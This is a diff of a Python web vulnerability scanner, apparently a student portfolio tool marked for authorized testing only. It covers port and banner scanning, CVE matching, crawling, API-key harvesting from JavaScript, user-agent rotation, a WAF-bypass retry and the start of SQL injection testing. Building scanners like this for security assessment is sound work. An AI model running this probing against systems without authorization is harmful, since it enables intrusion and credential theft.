-            "realpath() + str_starts_with() to validate base directory",
-            "Disable allow_url_include and allow_url_fopen in php.ini",
-        ],
-    },
-    "SSRF": {
-        "cvss": 8.6, "owasp": "A10:2021", "cwe": "CWE-918",
-        "impact": "Access cloud metadata (AWS keys), internal services, "
-                  "bypass firewalls, pivot to internal network.",
-        "fix": [
-            "Whitelist allowed domains/IPs for outbound requests",
-            "Block RFC 1918 and link-local addresses at network level",
-            "Use cloud IMDS v2 (requires token — not accessible via SSRF)",
-            "Disable URL fetch if not required by application",
-        ],
-    },
-    "CORS Misconfiguration": {
-        "cvss": 8.1, "owasp": "A05:2021", "cwe": "CWE-942",
-        "impact": "Any evil.com can make authenticated API calls on behalf "
-                  "of logged-in users, stealing session data and PII.",
-        "fix": [
-            "Set Access-Control-Allow-Origin to explicit trusted domain list",
-            "Never reflect request Origin header without validation",
-            "Avoid Access-Control-Allow-Credentials: true with wildcard origin",
-        ],
-    },
-    "Sensitive File Exposed": {
-        "cvss": 7.5, "owasp": "A05:2021", "cwe": "CWE-538",
-        "impact": "Credentials, API keys, DB passwords, source code exposed. "
-                  "Direct path to full system compromise.",
-        "fix": [
-            "Move sensitive files outside webroot entirely",
-            "Block access via .htaccess: Deny from all",
-            "Audit web server config to restrict file access",
-            "Add .git, .env to .gitignore and never commit secrets",
-        ],
-    },
-    "Missing Security Header": {
-        "cvss": 4.3, "owasp": "A05:2021", "cwe": "CWE-1021",
-        "impact": "Enables clickjacking, MIME sniffing, XSS, downgrade attacks.",
-        "fix": [
-            "Add headers in Apache: Header always set X-Frame-Options DENY",
-            "Nginx: add_header X-Frame-Options DENY;",
-            "Express.js: use helmet() middleware",
-        ],
-    },
-    "Command Injection": {
-        "cvss": 9.8, "owasp": "A03:2021", "cwe": "CWE-78",
-        "impact": "Full OS command execution as web server user. "
-                  "File read/write, reverse shell, lateral movement.",
-        "fix": [
-            "Never pass user input to shell_exec, system, exec",
-            "Use subprocess with argument list (not shell=True)",
-            "Validate input against strict whitelist",
-        ],
-    },
-    "Open Redirect": {
-        "cvss": 6.1, "owasp": "A01:2021", "cwe": "CWE-601",
-        "impact": "Phishing attacks using trusted domain name. "
-                  "OAuth token theft via redirect_uri manipulation.",
-        "fix": [
-            "Whitelist allowed redirect destinations",
-            "Never redirect to user-supplied URLs",
-            "Validate URL starts with known safe path before redirect",
-        ],
-    },
-    "Insecure Cookie": {
-        "cvss": 5.3, "owasp": "A07:2021", "cwe": "CWE-614",
-        "impact": "Session token stolen over HTTP, via XSS, or via CSRF.",
-        "fix": [
-            "Set-Cookie: session=val; Secure; HttpOnly; SameSite=Strict",
-            "Verify SameSite=Strict blocks CSRF for all state-changing requests",
-        ],
-    },
-    "Clickjacking": {
-        "cvss": 6.5, "owasp": "A05:2021", "cwe": "CWE-1021",
-        "impact": "UI redressing — trick users into clicking hidden buttons, "
-                  "enabling mic/cam, making purchases.",
-        "fix": [
-            "Add header: X-Frame-Options: DENY",
-            "OR: Content-Security-Policy: frame-ancestors 'none'",
-        ],
-    },
-    "IDOR": {
-        "cvss": 7.5, "owasp": "A01:2021", "cwe": "CWE-284",
-        "impact": "Access other users' data by changing ID in URL. "
-                  "Horizontal and vertical privilege escalation.",
-        "fix": [
-            "Enforce server-side authorization on every object access",
-            "Use unpredictable UUIDs instead of sequential integers",
-            "Never rely on client-supplied IDs without ownership validation",
-        ],
-    },
-    "API Key Exposed": {
-        "cvss": 9.1, "owasp": "A02:2021", "cwe": "CWE-312",
-        "impact": "Direct access to external service (AWS, Stripe, GitHub). "
-                  "Financial fraud, data theft, resource abuse.",
-        "fix": [
-            "Immediately rotate exposed key in provider console",
-            "Use environment variables — never hardcode in source",
-            "Scan repo with trufflehog/gitleaks before each commit",
-        ],
-    },
+VERSION_CVE = {
+    r"OpenSSH[_/ ]([\d.]+)": [((7,4),"CVE-2016-6515 DoS"),((8,5),"CVE-2021-28041 double-free"),((9,6),"CVE-2023-51385 RCE")],
+    r"Apache[/ ]([\d.]+)":   [((2,4,51),"CVE-2021-41773 path traversal/RCE"),((2,4,56),"CVE-2023-25690 request splitting")],
+    r"nginx[/ ]([\d.]+)":    [((1,21,0),"CVE-2021-23017 buffer overwrite"),((1,25,3),"CVE-2023-44487 HTTP/2 rapid reset")],
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  DATA STRUCTURES
+#  SCAN JOB
 # ══════════════════════════════════════════════════════════════════════════════
+class ScanJob:
+    PHASES = ["Phase 0: OSINT","Phase 1: Ports","Phase 2: Spider","Phase 3: Vulns"]
 
-@dataclass
-class Finding:
-    """Represents a single discovered vulnerability or security issue."""
-    vuln_id:    str
-    type:       str
-    severity:   str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
-    location:   str
-    parameter:  str  = ""
-    payload:    str  = ""
-    evidence:   str  = ""
-    extracted:  dict = field(default_factory=dict)
-    cvss:       float = 0.0
-    owasp:      str  = ""
-    cwe:        str  = ""
-    impact:     str  = ""
-    fix:        list = field(default_factory=list)
-    chain_type: str  = ""    # What the ChainEngine triggered this from
+    def __init__(self, url: str):
+        self.id          = str(uuid.uuid4())[:8]
+        self.url         = url.rstrip("/")
+        self.host        = urlparse(url).hostname or url
+        self.status      = "running"
+        self.logs:  deque = deque(maxlen=120)
+        self.vulns:  list = []
+        self.ports:  list = []
+        self.urls:   set  = set()
+        self.forms:  list = []
+        self.js_files: set = set()
+        self.secrets: list = []
+        self.chains:  list = []
+        self.waf:     str  = ""
+        self.progress: int = 0
+        self.current_phase = "Initializing"
+        self.phase_prog: dict = {p: {"done":0,"total":1} for p in self.PHASES}
+        self.start     = time.time()
+        self.elapsed   = 0
+        self._lock     = threading.Lock()
+        self._vcnt     = 0
+        self._ua_idx   = 0
+        self._delay    = REQUEST_DELAY
+        self._latency: list = []
 
-
-@dataclass
-class ScanState:
-    """Thread-safe shared state across all scanner components."""
-    target:          str
-    base_url:        str
-    start_time:      float           = field(default_factory=time.time)
-    findings:        list            = field(default_factory=list)
-    open_ports:      list            = field(default_factory=list)
-    discovered_urls: set             = field(default_factory=set)
-    js_files:        set             = field(default_factory=set)
-    forms:           list            = field(default_factory=list)
-    secrets:         list            = field(default_factory=list)
-    waf_detected:    Optional[str]   = None
-    scan_complete:   bool            = False
-    interrupted:     bool            = False
-    _lock:           threading.Lock  = field(default_factory=threading.Lock)
-    _vuln_counter:   int             = 0
-
-    def add_finding(self, f: Finding) -> None:
+    # ── Logging ────────────────────────────────────────────────────────────────
+    def log(self, msg: str, level: str = "INFO") -> None:
+        ts = datetime.now().strftime("%H:%M:%S")
         with self._lock:
-            self._vuln_counter += 1
-            f.vuln_id = f"VULN-{self._vuln_counter:03d}"
-            self.findings.append(f)
+            self.logs.append({"ts": ts, "msg": str(msg)[:120], "level": level})
+
+    def chain_event(self, msg: str) -> None:
+        ts = datetime.now().strftime("%H:%M:%S")
+        with self._lock:
+            self.chains.append({"ts": ts, "msg": msg})
+        self.log(f"⛓ CHAIN: {msg}", "CHAIN")
+
+    # ── Vulnerability recording ────────────────────────────────────────────────
+    def add_vuln(self, vtype: str, location: str, param: str = "",
+                 payload: str = "", evidence: str = "",
+                 extracted: dict = None, chain_type: str = "") -> None:
+        sev, cvss, impact = VULN_IMPACT.get(vtype, ("MEDIUM", 5.0, "Security issue found"))
+        fix = VULN_FIX.get(vtype, ["Review and remediate this vulnerability"])
+        with self._lock:
+            self._vcnt += 1
+            detail = evidence[:120] if extracted is None else evidence[:80]
+            if detail in [v["evidence"] for v in self.vulns]:
+                return
+            self.vulns.append({
+                "id":         f"VULN-{self._vcnt:03d}",
+                "type":       vtype,
+                "severity":   sev,
+                "cvss":       cvss,
+                "location":   location[:80],
+                "parameter":  param,
+                "payload":    payload[:80],
+                "evidence":   evidence[:150],
+                "extracted":  extracted or {},
+                "impact":     impact,
+                "fix":        fix,
+                "chain_type": chain_type,
+            })
+        self.log(f"[{sev}] {vtype} @ {location[:50]}", "VULN")
+
+    # ── Progress ───────────────────────────────────────────────────────────────
+    def set_phase(self, name: str, total: int = 10) -> None:
+        self.current_phase = name
+        with self._lock:
+            self.phase_prog[name] = {"done": 0, "total": max(total, 1)}
+
+    def advance(self, phase: str, by: int = 1) -> None:
+        with self._lock:
+            if phase in self.phase_prog:
+                pp = self.phase_prog[phase]
+                pp["done"] = min(pp["done"] + by, pp["total"])
+        self._recalc_progress()
+
+    def _recalc_progress(self) -> None:
+        total_done = sum(p["done"] for p in self.phase_prog.values())
+        total_all  = sum(p["total"] for p in self.phase_prog.values())
+        self.progress = int((total_done / max(total_all, 1)) * 100)
 
     def counts(self) -> dict:
+        c = {"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0}
         with self._lock:
-            c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
-            for f in self.findings:
-                c[f.severity] = c.get(f.severity, 0) + 1
-            return c
+            for v in self.vulns:
+                c[v["severity"]] = c.get(v["severity"],0) + 1
+        return c
 
+    def done(self) -> None:
+        self.status   = "done"
+        self.progress = 100
+        self.elapsed  = round(time.time() - self.start, 1)
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  UI MANAGER
-# ══════════════════════════════════════════════════════════════════════════════
-
-class UIManager:
-    """Manages all Rich live display output — zero plain print() calls."""
-
-    BANNER = """[bold red]
-██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
-██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
-██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
-██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
-██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝[/bold red]
-[bold cyan]        Persistent Heuristic Attack & Network Threat Observation Machine[/bold cyan]
-[yellow]        v{ver}  |  IIT Kanpur B.Cyber Portfolio  |  Authorized Testing Only[/yellow]"""
-
-    SEV_COLORS = {
-        "CRITICAL": "bold red",
-        "HIGH":     "bold yellow",
-        "MEDIUM":   "bold cyan",
-        "LOW":      "bold green",
-        "INFO":     "dim white",
-    }
-
-    def __init__(self):
-        self.console = Console()
-        self._log:   deque = deque(maxlen=22)
-        self._phase_progress: dict = {}
-        self._state: Optional[ScanState] = None
-        self._lock = threading.Lock()
-        self._current_phase = ""
-
-    def print_banner(self, target: str) -> None:
-        self.console.print(Text.from_markup(
-            self.BANNER.format(ver=SCANNER_VERSION)
-        ))
-        self.console.print(Rule(style="red"))
-        info = Table(show_header=False, box=box.SIMPLE, padding=(0, 2))
-        info.add_column(style="cyan")
-        info.add_column(style="white")
-        info.add_row("Target",     target)
-        info.add_row("Started",    datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
-        info.add_row("Scanner",    f"PHANTOM v{SCANNER_VERSION}")
-        info.add_row("Warning",    "[red]AUTHORIZED TARGETS ONLY — IT Act 2000, Sec 66[/red]")
-        self.console.print(Panel(info, title="[bold cyan]◈  TARGET INFO[/bold cyan]",
-                                 border_style="cyan"))
-
-    def set_state(self, state: ScanState) -> None:
-        self._state = state
-
-    def log(self, msg: str, level: str = "INFO") -> None:
-        ts  = datetime.now().strftime("%H:%M:%S")
-        color_map = {
-            "INFO": "white", "OK": "green", "VULN": "bold red",
-            "WARN": "yellow", "SKIP": "dim", "CHAIN": "bold magenta",
-        }
-        color = color_map.get(level, "white")
-        icon  = {"INFO": "◦", "OK": "✓", "VULN": "★", "WARN": "⚠",
-                 "SKIP": "–", "CHAIN": "⛓"}.get(level, "◦")
-        with self._lock:
-            self._log.append(f"[dim][{ts}][/dim] [{color}]{icon} {msg}[/{color}]")
-
-    def set_phase(self, name: str, total: int) -> None:
-        with self._lock:
-            self._phase_progress[name] = {"done": 0, "total": total}
-            self._current_phase = name
-
-    def advance_phase(self, name: str, by: int = 1) -> None:
-        with self._lock:
-            if name in self._phase_progress:
-                self._phase_progress[name]["done"] = min(
-                    self._phase_progress[name]["done"] + by,
-                    self._phase_progress[name]["total"]
-                )
-
-    def get_layout(self) -> Layout:
-        layout = Layout()
-        layout.split_column(
-            Layout(self._build_phases_log_row(), name="main", ratio=1),
-            Layout(self._build_counter_bar(),    name="bottom", size=5),
-        )
-        return layout
-
-    def _build_phases_log_row(self) -> Panel:
-        phases_table = Table(box=None, show_header=False,
-                             padding=(0, 1), expand=True)
-        phases_table.add_column("Phase", style="cyan", width=24)
-        phases_table.add_column("Bar",   ratio=1)
-        phases_table.add_column("%",     style="bold white", width=5)
-
-        with self._lock:
-            phases = dict(self._phase_progress)
-            current = self._current_phase
-
-        for name, info in phases.items():
-            done, total = info["done"], max(info["total"], 1)
-            pct   = int((done / total) * 100)
-            n_fill = int((done / total) * 20)
-            bar    = f"[green]{'█' * n_fill}[/green][dim]{'░' * (20 - n_fill)}[/dim]"
-            style  = "bold cyan" if name == current else "dim"
-            phases_table.add_row(f"[{style}]{name}[/{style}]", bar, f"[{style}]{pct}%[/{style}]")
-
-        phases_panel = Panel(phases_table,
-                             title="[bold cyan]◈  SCAN PHASES[/bold cyan]",
-                             border_style="blue", padding=(0, 1))
-
-        log_text = Text()
-        with self._lock:
-            lines = list(self._log)
-        for line in lines:
-            log_text.append_text(Text.from_markup(line))
-            log_text.append("\n")
-
-        log_panel = Panel(log_text, title="[bold cyan]◈  LIVE ACTIVITY[/bold cyan]",
-                          border_style="blue", padding=(0, 1))
-
-        combined = Table(box=None, show_header=False, expand=True, padding=0)
-        combined.add_column(ratio=1)
-        combined.add_column(ratio=2)
-        combined.add_row(phases_panel, log_panel)
-        return combined
-
-    def _build_counter_bar(self) -> Panel:
-        counts = self._state.counts() if self._state else \
-                 {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
-        total  = sum(counts.values())
-        t = Table(box=None, show_header=False, expand=True, padding=(0, 2))
-        t.add_column()
-        cells = []
-        for sev, cnt in counts.items():
-            color = self.SEV_COLORS.get(sev, "white")
-            cells.append(f"[{color}]{sev}: {cnt}[/{color}]  ")
-        cells.append(f"[bold white]TOTAL: {total}[/bold white]")
-        t.add_row("  ".join(cells))
-        return Panel(t, title="[bold cyan]◈  VULNERABILITIES[/bold cyan]",
-                     border_style="red", padding=(0, 1))
-
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  PORT SCANNER
-# ══════════════════════════════════════════════════════════════════════════════
-
-class PortScanner:
-    """Async socket-based port scanner with banner grabbing and CVE detection."""
-
-    def __init__(self, host: str, ui: UIManager):
-        self.host = host
-        self.ui   = ui
-
-    async def _check_port(self, port: int, sem: asyncio.Semaphore) -> Optional[dict]:
-        async with sem:
-            try:
-                reader, writer = await asyncio.wait_for(
-                    asyncio.open_connection(self.host, port), timeout=PORT_TIMEOUT
-                )
-                banner = ""
-                try:
-                    if port in (80, 8080, 8000, 8008):
-                        writer.write(b"HEAD / HTTP/1.0\r\nHost: " +
-                                     self.host.encode() + b"\r\n\r\n")
-                        await writer.drain()
-                    elif port == 21:
-                        pass  # FTP sends banner on connect
-                    elif port == 22:
-                        pass  # SSH sends banner on connect
-                    elif port == 25:
-                        writer.write(b"EHLO phantom.test\r\n")
-                        await writer.drain()
-                    data   = await asyncio.wait_for(reader.read(512), timeout=2.0)
-                    banner = data.decode("utf-8", errors="ignore").strip()[:120]
-                except Exception:
-                    pass
-                writer.close()
-                try:
-                    await writer.wait_closed()
-                except Exception:
-                    pass
-                return {"port": port, "banner": banner}
-            except Exception:
-                return None
-
-    async def scan_async(self, ports: list) -> list:
-        sem    = asyncio.Semaphore(100)
-        tasks  = [self._check_port(p, sem) for p in ports]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        return [r for r in results if r and isinstance(r, dict)]
-
-    def detect_service(self, port: int, banner: str) -> dict:
-        """Identify service, version, and CVEs from port + banner."""
-        svc     = ""
-        version = ""
-        cves    = []
-
-        port_map = {
-            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
-            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
-            443: "HTTPS", 445: "SMB", 1433: "MSSQL", 3306: "MySQL",
-            3389: "RDP", 5432: "PostgreSQL", 6379: "Redis",
-            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9200: "Elasticsearch",
-            27017: "MongoDB", 11211: "Memcached", 8888: "Jupyter",
-        }
-        svc = port_map.get(port, f"Port-{port}")
-
-        # Version extraction via banner regex
-        patterns = [
-            ("OpenSSH", r"OpenSSH[_/ ](\d+\.\d+)", lambda m: tuple(int(x) for x in m.group(1).split("."))),
-            ("Apache",  r"Apache[/ ](\d+\.\d+\.?\d*)", lambda m: tuple(int(x) for x in m.group(1).split("."))),
-            ("nginx",   r"nginx[/ ](\d+\.\d+\.?\d*)", lambda m: tuple(int(x) for x in m.group(1).split("."))),
-        ]
-        for svc_name, pattern, parser in patterns:
-            m = re.search(pattern, banner, re.IGNORECASE)
-            if m:
-                version = m.group(0)
-                try:
-                    ver_tuple = parser(m)
-                    for check_fn, cve_desc in VERSION_CVE_MAP.get(svc_name, []):
-                        if check_fn(ver_tuple):
-                            cves.append(cve_desc)
-                except Exception:
-                    pass
-
-        return {"service": svc, "version": version, "cves": cves}
-
-    def run(self, state: ScanState) -> list:
-        self.ui.log(f"Scanning {len(TOP_1000_PORTS)} ports on {self.host}...", "INFO")
-        self.ui.set_phase("Phase 1: Ports", len(TOP_1000_PORTS))
-
-        loop   = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            raw = loop.run_until_complete(self.scan_async(TOP_1000_PORTS))
-        finally:
-            loop.close()
-
-        open_ports = []
-        for r in raw:
-            port   = r["port"]
-            banner = r["banner"]
-            info   = self.detect_service(port, banner)
-            entry  = {**r, **info}
-            open_ports.append(entry)
-            risk_label = ""
-            if info["service"] in DANGEROUS_SERVICES:
-                risk, reason, cve = DANGEROUS_SERVICES[info["service"]]
-                risk_label = f" [{risk}]"
-                state.add_finding(Finding(
-                    vuln_id="", type="Open Service",
-                    severity=risk,
-                    location=f"Port {port}",
-                    evidence=f"{info['service']} — {reason}",
-                    cvss={"CRITICAL": 9.0, "HIGH": 7.5, "MEDIUM": 5.0}.get(risk, 3.0),
-                    owasp="A06:2021", cwe="CWE-200",
-                    impact=reason,
-                    fix=[f"Restrict port {port} via firewall", "Update service to latest version"],
-                ))
-            for cve_desc in info["cves"]:
-                state.add_finding(Finding(
-                    vuln_id="", type="Outdated Service / CVE",
-                    severity="HIGH", location=f"Port {port}",
-                    evidence=f"{info['version']} — {cve_desc}",
-                    cvss=7.5, owasp="A06:2021", cwe="CWE-1035",
-                    impact="Known exploitable vulnerability in service version",
-                    fix=["Update to latest patched version immediately"],
-                ))
-            self.ui.log(f"Port {port} ({info['service']}){risk_label}", "OK" if not risk_label else "VULN")
-            self.ui.advance_phase("Phase 1: Ports", 1)
-
-        state.open_ports = open_ports
-        self.ui.log(f"Found {len(open_ports)} open ports", "OK")
-        return open_ports
-
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  WEB CRAWLER
-# ══════════════════════════════════════════════════════════════════════════════
-
-class WebCrawler:
-    """Recursive web spider — extracts URLs, JS endpoints, forms, and secrets."""
-
-    JS_ENDPOINT_PATTERNS = [
-        r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""",
-        r"""axios\s*\.\s*(?:get|post|put|delete)\s*\(\s*['"`]([^'"`]+)['"`]""",
-        r"""(?:url|endpoint|path|href|src)\s*[:=]\s*['"`]([/][^'"`\s]{3,})['"`]""",
-        r"""(?:apiUrl|baseUrl|API_URL)\s*=\s*['"`](https?://[^'"`]+)['"`]""",
-        r"""ws[s]?://[^'"`\s]+""",
-    ]
-
-    def __init__(self, base_url: str, ui: UIManager):
-        self.base_url  = base_url
-        self.base_host = urlparse(base_url).netloc
-        self.ui        = ui
-        self._ua_idx   = 0
-        self._session  = requests.Session()
-        self._latency_samples: list = []
-        self._current_delay = REQUEST_DELAY
-
-    def _headers(self) -> dict:
-        ua = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
+    # ── HTTP helper ────────────────────────────────────────────────────────────
+    def req(self, url: str, method: str = "GET", waf_bypass: bool = False, **kw) -> Optional[requests.Response]:
+        h = {"User-Agent": USER_AGENTS[self._ua_idx % len(USER_AGENTS)],
+             "Accept": "text/html,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5"}
         self._ua_idx += 1
-        return {"User-Agent": ua, "Accept": "text/html,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive"}
-
-    def _req(self, url: str, method: str = "GET", **kwargs) -> Optional[requests.Response]:
-        """Rate-limited request with dynamic delay and retry."""
-        for attempt in range(3):
-            try:
-                t0   = time.time()
-                resp = self._session.request(
-                    method, url, headers=self._headers(),
-                    timeout=REQUEST_TIMEOUT, verify=False,
-                    allow_redirects=True, **kwargs
-                )
-                latency = time.time() - t0
-                self._latency_samples.append(latency)
-                if len(self._latency_samples) > 10:
-                    self._latency_samples.pop(0)
-                avg = sum(self._latency_samples) / len(self._latency_samples)
-                # Dynamic rate limiting: if avg latency > 2s, slow down
-                self._current_delay = min(REQUEST_DELAY + (avg - 0.5) * 0.1, 2.0) \
-                                      if avg > 0.5 else REQUEST_DELAY
-                time.sleep(self._current_delay)
-                return resp
-            except requests.exceptions.SSLError:
-                self._session.verify = False
-                continue
-            except requests.exceptions.ConnectionError:
-                time.sleep(2 ** attempt)
-                continue
-            except Exception:
-                return None
-        return None
-
-    def crawl(self, state: ScanState, depth: int = 0, url: str = "") -> None:
-        if depth > CRAWL_DEPTH or len(state.discovered_urls) >= MAX_URLS:
-            return
-        url = url or self.base_url
-        if url in state.discovered_urls:
-            return
-        state.discovered_urls.add(url)
-
-        resp = self._req(url)
-        if not resp:
-            return
-
-        self.ui.log(f"Crawled [{resp.status_code}] {url[:70]}", "INFO")
-        soup = BeautifulSoup(resp.text, "html.parser")
-
-        # Extract all links
-        for tag, attr in [("a", "href"), ("form", "action"), ("script", "src"),
-                          ("link", "href"), ("iframe", "src"), ("img", "src")]:
-            for el in soup.find_all(tag):
-                raw = el.get(attr, "")
-                if not raw or raw.startswith(("mailto:", "tel:", "#", "javascript:")):
-                    continue
-                full = urljoin(url, raw)
-                parsed = urlparse(full)
-                if parsed.netloc != self.base_host:
-                    continue
-                clean = parsed._replace(fragment="").geturl()
-                if clean not in state.discovered_urls and len(state.discovered_urls) < MAX_URLS:
-                    if tag == "script" and attr == "src":
-                        state.js_files.add(clean)
-                    self.crawl(state, depth + 1, clean)
-
-        # Extract JS endpoints and secrets from inline scripts
-        for script in soup.find_all("script"):
-            js_content = script.string or ""
-            if js_content:
-                self._parse_js(js_content, url, state)
-
-        # HTML comments (developer notes, hidden endpoints)
-        for comment in soup.find_all(string=lambda t: isinstance(t, str) and "<!--" not in t):
-            pass
-        import bs4
-        for comment in soup.find_all(string=lambda text: isinstance(text, bs4.Comment)):
-            comment_text = str(comment)
-            paths = re.findall(r"(/[a-zA-Z0-9_\-/]+)", comment_text)
-            for p in paths:
-                full = urljoin(url, p)
-                if urlparse(full).netloc == self.base_host:
-                    state.discovered_urls.add(full)
-            self.ui.log(f"HTML comment found: {comment_text[:60]}", "WARN")
-
-        # Extract forms
-        for form in soup.find_all("form"):
-            action  = urljoin(url, form.get("action", url))
-            method  = form.get("method", "get").upper()
-            inputs  = {
-                i.get("name"): i.get("value", "")
-                for i in form.find_all(["input", "textarea", "select"])
-                if i.get("name")
-            }
-            if inputs:
-                with state._lock:
-                    state.forms.append({
-                        "action": action, "method": method,
-                        "inputs": inputs, "source_url": url,
-                    })
-
-    def _parse_js(self, js: str, source_url: str, state: ScanState) -> None:
-        """Extract endpoints and secrets from JavaScript content."""
-        for pattern in self.JS_ENDPOINT_PATTERNS:
-            for m in re.finditer(pattern, js):
-                path = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
-                if path.startswith(("//", "http", "ws")):
-                    full = path
-                elif path.startswith("/"):
-                    full = urljoin(self.base_url, path)
-                else:
-                    continue
-                if urlparse(full).netloc in ("", self.base_host):
-                    if full not in state.discovered_urls:
-                        state.discovered_urls.add(full)
-
-        # Scan for secrets
-        for key_type, pattern in API_KEY_PATTERNS.items():
-            for m in re.finditer(pattern, js):
-                secret = m.group(0)[:80]
-                self.ui.log(f"SECRET in JS: {key_type} — {secret[:40]}...", "VULN")
-                with state._lock:
-                    state.secrets.append({
-                        "type": key_type, "value": secret,
-                        "source": source_url,
-                    })
-
-    def fetch_js_files(self, state: ScanState) -> None:
-        """Download and parse all discovered .js files."""
-        for js_url in list(state.js_files):
-            resp = self._req(js_url)
-            if resp and resp.status_code == 200:
-                self._parse_js(resp.text, js_url, state)
-                self.ui.log(f"Parsed JS: {js_url[:60]}", "INFO")
-
-    def parse_robots(self, state: ScanState) -> None:
-        resp = self._req(urljoin(self.base_url, "/robots.txt"))
-        if resp and resp.status_code == 200:
-            for line in resp.text.splitlines():
-                if line.strip().lower().startswith("disallow:"):
-                    path = line.split(":", 1)[1].strip()
-                    full = urljoin(self.base_url, path)
-                    if urlparse(full).netloc == self.base_host:
-                        state.discovered_urls.add(full)
-                        self.ui.log(f"robots.txt Disallow: {path}", "WARN")
-
-    def parse_sitemap(self, state: ScanState) -> None:
-        resp = self._req(urljoin(self.base_url, "/sitemap.xml"))
-        if resp and resp.status_code == 200:
-            for m in re.finditer(r"<loc>(.*?)</loc>", resp.text):
-                url = m.group(1).strip()
-                if urlparse(url).netloc == self.base_host:
-                    state.discovered_urls.add(url)
-
-    def run(self, state: ScanState) -> None:
-        self.ui.set_phase("Phase 2: Spider", 5)
-        self.parse_robots(state)
-        self.ui.advance_phase("Phase 2: Spider")
-        self.parse_sitemap(state)
-        self.ui.advance_phase("Phase 2: Spider")
-        self.crawl(state)
-        self.ui.advance_phase("Phase 2: Spider")
-        self.fetch_js_files(state)
-        self.ui.advance_phase("Phase 2: Spider")
-        self.ui.log(f"Spider complete — {len(state.discovered_urls)} URLs, "
-                    f"{len(state.forms)} forms, {len(state.js_files)} JS files", "OK")
-        self.ui.advance_phase("Phase 2: Spider")
-
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  VULN ENGINE  (12 Modules)
-# ══════════════════════════════════════════════════════════════════════════════
-
-class VulnEngine:
-    """All vulnerability scanning modules A–L."""
-
-    def __init__(self, base_url: str, ui: UIManager, state: ScanState):
-        self.base_url = base_url
-        self.base_host = urlparse(base_url).netloc
-        self.ui       = ui
-        self.state    = state
-        self._ua_idx  = 0
-        self._session = requests.Session()
-
-    def _headers(self) -> dict:
-        ua = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
-        self._ua_idx += 1
-        return {"User-Agent": ua, "Accept": "text/html,*/*;q=0.8"}
-
-    def _req(self, url: str, method: str = "GET", waf_bypass: bool = False,
-             **kwargs) -> Optional[requests.Response]:
         for attempt in range(2):
             try:
-                resp = self._session.request(
-                    method, url, headers=self._headers(),
-                    timeout=REQUEST_TIMEOUT, verify=False,
-                    allow_redirects=True, **kwargs
-                )
-                if resp.status_code == 403 and waf_bypass and attempt == 0:
-                    # WAF bypass: retry with URL-encoded payload
-                    if "params" in kwargs:
-                        encoded = {k: quote(str(v), safe="") for k, v in kwargs["params"].items()}
-                        kwargs["params"] = encoded
+                t0 = time.time()
+                r  = requests.request(method, url, headers=h, timeout=REQUEST_TIMEOUT,
+                                      verify=False, allow_redirects=True, **kw)
+                lat = time.time() - t0
+                self._latency.append(lat)
+                if len(self._latency) > 10: self._latency.pop(0)
+                avg = sum(self._latency) / len(self._latency)
+                self._delay = min(REQUEST_DELAY + max(0, avg - 0.5) * 0.1, 2.0)
+                time.sleep(self._delay)
+                if r.status_code == 403 and waf_bypass and attempt == 0:
+                    if "params" in kw:
+                        kw["params"] = {k: quote(str(v)) for k,v in kw["params"].items()}
                     continue
-                time.sleep(self.state._lock and REQUEST_DELAY or REQUEST_DELAY)
-                return resp
-            except Exception:
-                return None
+                return r
+            except: return None
         return None
 
-    def _vuln(self, vtype: str, sev: str, loc: str, **kwargs) -> None:
-        meta = VULN_META.get(vtype, {})
-        f = Finding(
-            vuln_id="", type=vtype, severity=sev, location=loc,
-            cvss=meta.get("cvss", 0.0), owasp=meta.get("owasp", ""),
-            cwe=meta.get("cwe", ""), impact=meta.get("impact", ""),
-            fix=meta.get("fix", []), **kwargs,
-        )
-        self.state.add_finding(f)
-        self.ui.log(f"[{sev}] {vtype} @ {loc[:50]}", "VULN")
+# ══════════════════════════════════════════════════════════════════════════════
+#  PHASE 0 — OSINT / RECON
+# ══════════════════════════════════════════════════════════════════════════════
+def phase_osint(job: ScanJob) -> None:
+    job.set_phase("Phase 0: OSINT", 5)
+    job.log("Starting OSINT recon...", "INFO")
 
-    # ── Module A: SQL Injection ───────────────────────────────────────────────
-    def test_sqli(self, url: str) -> None:
-        """Error-based + Union-based SQLi detection with DB enumeration."""
-        parsed = urlparse(url)
-        if not parsed.query:
-            return
-        params = dict(parse_qsl(parsed.query))
+    # IP
+    try:
+        ip = socket.gethostbyname(job.host)
+        job.log(f"IP: {ip}", "OK")
+    except: job.log("Cannot resolve hostname", "WARN")
+    job.advance("Phase 0: OSINT")
 
-        for param in params:
-            baseline = self._req(url)
-            baseline_len = len(baseline.text) if baseline else 0
-
-            for payload in SQL_PAYLOADS:
-                tp = params.copy(); tp[param] = payload
-                resp = self._req(url, params=tp, waf_bypass=True)
-                if not resp:
-                    continue
-                body_lower = resp.text.lower()
-
-                # Error-based detection
